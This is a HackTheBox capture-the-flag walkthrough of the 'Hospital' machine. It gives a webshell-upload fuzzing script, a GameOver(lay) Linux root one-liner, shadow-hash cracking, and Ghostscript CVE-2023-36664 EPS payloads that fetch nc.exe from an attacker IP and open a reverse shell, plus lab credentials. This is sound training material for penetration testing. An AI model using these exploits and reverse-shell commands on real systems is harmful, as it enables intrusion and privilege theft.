---
icon: flag
---

# hospital

Hospital is a medium-level challenge on HackTheBox, that covers a diverse range of exploitation techniques. Beginning with the discovery of a file upload vulnerability, leading to the exploitation of a privilege escalation flaw on a Linux server using 'unshare' \[CVE-2023-2640 & CVE-2023-32629 GameOver(lay)]. Continuing with the creation of a malicious EPS file to exploit a command injection vulnerability in Ghostscript to get access to a Windows machine\[CVE-2023-36664]. Additionally, finding various paths for achieving administrative access, such as exploiting misconfigurations in XAMPP by uploading an administrative webshell, and uncovering plaintext credentials via RDP.

## Enumeration

Beginning with an initial Nmap scan targeting all ports using TCP SYN scan at a rate of minimum 5000 packets per second. The scan results are saved to a file named 'allPorts' in 'grep' format, facilitating the extraction of discovered ports. Afterwards, an exhaustive scan is conducted on each identified port using a more direct approach

```bash
sudo nmap -sS -p- --open -n -Pn --min-rate=5000 10.10.11.241 -oG allPorts -vvv
```

```java
PORT     STATE SERVICE          REASON
22/tcp   open  ssh              syn-ack ttl 62
53/tcp   open  domain           syn-ack ttl 127
88/tcp   open  kerberos-sec     syn-ack ttl 127
135/tcp  open  msrpc            syn-ack ttl 127
139/tcp  open  netbios-ssn      syn-ack ttl 127
389/tcp  open  ldap             syn-ack ttl 127
443/tcp  open  https            syn-ack ttl 127
445/tcp  open  microsoft-ds     syn-ack ttl 127
464/tcp  open  kpasswd5         syn-ack ttl 127
593/tcp  open  http-rpc-epmap   syn-ack ttl 127
636/tcp  open  ldapssl          syn-ack ttl 127
1801/tcp open  msmq             syn-ack ttl 127
2103/tcp open  zephyr-clt       syn-ack ttl 127
2105/tcp open  eklogin          syn-ack ttl 127
2107/tcp open  msmq-mgmt        syn-ack ttl 127
2179/tcp open  vmrdp            syn-ack ttl 127
3268/tcp open  globalcatLDAP    syn-ack ttl 127
3269/tcp open  globalcatLDAPssl syn-ack ttl 127
3389/tcp open  ms-wbt-server    syn-ack ttl 127
5985/tcp open  wsman            syn-ack ttl 127
6404/tcp open  boe-filesvr      syn-ack ttl 127
6406/tcp open  boe-processsvr   syn-ack ttl 127
6407/tcp open  boe-resssvr1     syn-ack ttl 127
6409/tcp open  boe-resssvr3     syn-ack ttl 127
6615/tcp open  unknown          syn-ack ttl 127
6631/tcp open  unknown          syn-ack ttl 127
6643/tcp open  unknown          syn-ack ttl 127
8080/tcp open  http-proxy       syn-ack ttl 62
9389/tcp open  adws             syn-ack ttl 127
```

An exhaustive Nmap scan is conducted on the identified ports to determine their respective versions and to search for potential exploit scripts. This approach optimizes resource usage by first identifying the open ports extracted from the previously saved 'grep' format file before initiating targeted scans for version detection and exploit potential.

```bash
sudo nmap -sVC -p22,53,88,135,139,389,443,445,464,593,636,1801,2103,2105,2107,2179,3268,3269,3389,5985,6404,6406,6407,6409,6615,6631,6643,8080,9389 --min-rate=5000 -n -Pn 10.10.11.241 -oN targeted
```

```java
PORT     STATE SERVICE           VERSION
22/tcp   open  ssh               OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa (ECDSA)
|_  256 96:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca (ED25519)
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2024-04-26 10:09:27Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
443/tcp  open  ssl/http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
|_http-title: Hospital Webmail :: Welcome to Hospital Webmail
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
1801/tcp open  msmq?
2103/tcp open  msrpc             Microsoft Windows RPC
2105/tcp open  msrpc             Microsoft Windows RPC
2107/tcp open  msrpc             Microsoft Windows RPC
2179/tcp open  vmrdp?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
3269/tcp open  globalcatLDAPssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
3389/tcp open  ms-wbt-server     Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: HOSPITAL
|   NetBIOS_Domain_Name: HOSPITAL
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: hospital.htb
|   DNS_Computer_Name: DC.hospital.htb
|   DNS_Tree_Name: hospital.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2024-04-26T10:10:26+00:00
| ssl-cert: Subject: commonName=DC.hospital.htb
| Not valid before: 2024-04-25T10:03:13
|_Not valid after:  2024-10-25T10:03:13
5985/tcp open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
6404/tcp open  msrpc             Microsoft Windows RPC
6406/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
6407/tcp open  msrpc             Microsoft Windows RPC
6409/tcp open  msrpc             Microsoft Windows RPC
6615/tcp open  msrpc             Microsoft Windows RPC
6631/tcp open  msrpc             Microsoft Windows RPC
6643/tcp open  msrpc             Microsoft Windows RPC
8080/tcp open  http              Apache httpd 2.4.55 ((Ubuntu))
| http-title: Login
|_Requested resource was login.php
|_http-server-header: Apache/2.4.55 (Ubuntu)
|_http-open-proxy: Proxy might be redirecting requests
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
9389/tcp open  mc-nmf            .NET Message Framing
Service Info: Host: DC; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m52s, deviation: 0s, median: 6h59m52s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-04-26T10:10:26
|_  start_date: N/A
```

The hostname 'hospital.htb' was added to the '/etc/hosts' file for ease of reference. While not strictly necessary as the machine did not utilize subdomains, this action was taken to maintain brevity and clarity in the subsequent steps of the process.

```bash
echo "10.10.11.241 hospital.htb" | sudo tee -a /etc/hosts
```

Visiting hospital.htb:8080 gives and option to create an account, click on **Make one** http://hospital.htb:8080/login.php

![make an account](../../.gitbook/assets/make_an_account.png)

Initiating the creation of a new account at http://hospital.htb:8080/register.php, click on Submit after completing the required fields.

![creating account](../../.gitbook/assets/creating_account.png)

Proceeding to http://hospital.htb:8080/login.php, log in using the newly created account.

![login with new account](../../.gitbook/assets/login_new_account.png)

After successful login, the website at http://hospital.htb:8080/index.php presents the option to upload files to the server.

![upload button](../../.gitbook/assets/homepage_upload.png)

## File upload exploit

After capturing and analyzing the request, it becomes apparent that the server has a file upload vulnerability related to the file extension.

![request from upload.php](../../.gitbook/assets/request_1.png)

A custom script was made to automate the task of fuzzing extensions on post requests directed at the 'upload.php' of the target machine, using a custom wordlist with the php extensions from [hacktricks file upload page](https://book.hacktricks.xyz/pentesting-web/file-upload#file-upload-general-methodology.). The script facilitates the automated upload of a webshell to the server, facilitating the process of identifying valid extensions and exploiting the vulnerability.

```bash
## Define the URL
url = 'http://hospital.htb:8080/upload.php'

## Define the headers
headers = {
    'Referer': 'http://hospital.htb:8080/index.php',
    'Cookie': 'PHPSESSID=k1ajocskfrc83hru642ag5p9nc',
    'Connection': 'close'
}

def fuzz_upload(wordlist,webshell,fname):
    #upload shell

    with open(webshell,'r') as file:
        shell_data = file.read()

    with open(wordlist,"r") as my_wordlist:
        for line in my_wordlist:
            ext=line.strip()
            files = {
                'image': (f'{fname}.{ext}', shell_data, 'image/jpeg')
            }

            response = requests.post(url, headers=headers, files=files)
            #print(response.text)

            if not "Error" in response.text:
                print(f"[+] Uploaded {fname}.{ext}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="upload fuzzing extension tool")
    parser.add_argument("-w", "--wordlist", required=True, help="File containing extensions")
    parser.add_argument("-x", "--webshell", required=True, help="File containing webshell")
    parser.add_argument("-f", "--filename", required=False, default="file", help="filename to use, default 'file' without the extention")
    args = parser.parse_args()

    fuzz_upload(args.wordlist,args.webshell,args.filename)
```

The script is used to upload the [p0wny-shell](https://github.com/flozz/p0wny-shell) while finding valid extensions at the same time.

![uploading p0wny](../../.gitbook/assets/uploading_p0wny.png)

After successfully uploading the files, the fuzzing process began to find their storage location using ffuf. The point of interest was the 'uploads' folder, where files were found to be stored with identical names as those used during the upload process. Despite the absence of directory listing functionality in /uploads, the files within the 'uploads' directory retained their original filenames, facilitating their retrieval and exploitation.

```bash
ffuf -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt:FUZZ -u http://hospital.htb:8080/FUZZ -o hospital_htb_8080_FUZZ.out -t 15
```

![fuzzing uploads](../../.gitbook/assets/ffuf_uploads.png)

## Shell on Linux Server

The webshell is discovered at http://hospital.htb:8080/uploads/myfile.phar, where the '.phar' extension was identified as the one capable of executing php code among various other extensions attempted.

![p0wny shell on linux server](../../.gitbook/assets/p0wny_shell_1.png)

Gaining access to the Linux server that hosts http://hospital.htb:8080.

For a stable shell do:

* nc -lnvp 443
* script /dev/null -c bash
* (ctrl+z)
* stty raw -echo ; fg
* reset xterm (then press enter)
* export TERM=xterm
* export SHELL=bash

Upon reviewing the 'ifconfig' output, it is determined that the attacker is located within a separate network, as indicated by the 'eth0 inet' IP address.

![ifconfig output](../../.gitbook/assets/ifconfig_ouptut_1.png)

## Privesc on Linux Server

Further enumeration shows that the Linux machine is vulnerable to CVE-2023-32629 & CVE-2023-2640 privilege escalation exploits based on the machine kernel which is 5.19.0-35-generic Ubuntu, the exploit works in a path where www-data can read and write.

poc.sh

```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
```

![privesc on LS](../../.gitbook/assets/privesc_linux_server_2.png)

Upon achieving root access, the /etc/shadow file is accessible, allowing for the extraction of hashes for cracking attempts.

![reading /etc/shadow](../../.gitbook/assets/reading_shadow.png)

Using hashcat, the password for 'drwilliams' is successfully cracked. `qwe123!@#`

```bash
hashcat -a 0 -m 1800 drwilliams_hash /usr/share/wordlists/rockyou.txt
```

## Access to the Windows server

The credentials obtained of drwilliams work for the https://hospital.htb webmail.

![drwilliams webmail](../../.gitbook/assets/drwilliams_webmail_1.png)

An email originating from drbrown@hospital.htb instructs drwilliams to send an .eps file intended for visualization with Ghostscript.

![email from drbrown](../../.gitbook/assets/email_from_drbrown_1.png)

A vulnerability in Ghostscript, identified as CVE-2023-36664, enables command injection upon opening a PS or EPS file, potentially resulting in code execution.

Use the [GhostScript Command Injection POC](https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection) to create a malicious EPS file and gain a reverse shell.

The first step is injecting code that will download nc.exe from the attacker server.

```bash
python CVE_023_36664_exploit.py --inject --payload 'curl 10.10.14.26/nc.exe' --filename file.eps
```

![running the payload](../../.gitbook/assets/curl_nc_ghostscript.png)

Access the compose function, attach the malicious .eps file, set the recipient as Drbrown, and proceed to send the email.

![composing email](../../.gitbook/assets/composing_email_1.png)

The attacker's machine receives a GET request, confirming the success of the code injection. Afterwards, nc.exe is now present on the victim machine.

![received "get" hit](../../.gitbook/assets/get_hit_1.png)

The attacker proceeds to create and send another malicious .eps file, this time the code injection will tell the victim machine to execute nc.exe and send a reverse shell to the attacker's machine.

```bash
python CVE_023_36664_exploit.py --inject --payload 'nc.exe -e cmd 10.10.14.26 9001' --filename file.eps
```

![ghostscript reverse shell injection](../../.gitbook/assets/ghostscript_reverse_shell.png)

![composing another email](../../.gitbook/assets/composing_email_2.png)

A reverse shell connection is established, granting the attacker access to the victim machine.

![ps shell received](../../.gitbook/assets/recv_ps_shell_1.png)

The user flag is at **C:�sers\drbrown.HOSPITAL\Desktop**

![shell as drbrown](../../.gitbook/assets/whoami_drbrown_1.png)

## Root

### solution 1 (XAMPP misconfiguration)

Go to C: mpp\htdocs and upload the [p0wny-shell](https://github.com/flozz/p0wny-shell) there.

serving the p0wny shell

![serving p0wny](../../.gitbook/assets/serving_p0wny_1.png)

downloading the p0wny shell in the htdocs directory

![saving p0wny](../../.gitbook/assets/saving_p0wny_htdocs.png)

Navigate to https://hospital.htb/pwny.php and a shell as nt authority will be given

![whoami admin](../../.gitbook/assets/whoami_admin_1.png)

### Solution 2 RDP

There is a password in the ghostscript.bat file. **drbrown:chr!$br0wn**

![drbrown pass](../../.gitbook/assets/drbrown_pass_1.png)

Connect to rdp as user drbrown

```bash
xfreerdp /v:10.10.11.241 /u:drbrown /p:'chr!$br0wn'
```

Here the password can be retrieved in cleartext by just changing the input type from "password" to "text". **Administrator:Th3B3stH0sp1t4l9786!**

![admin pass](../../.gitbook/assets/admin_pass_1.png)

The credentials successfully authenticate with evil-winrm, granting admin access to the victim machine.

![winrm as admin](../../.gitbook/assets/winrm_as_admin.png)
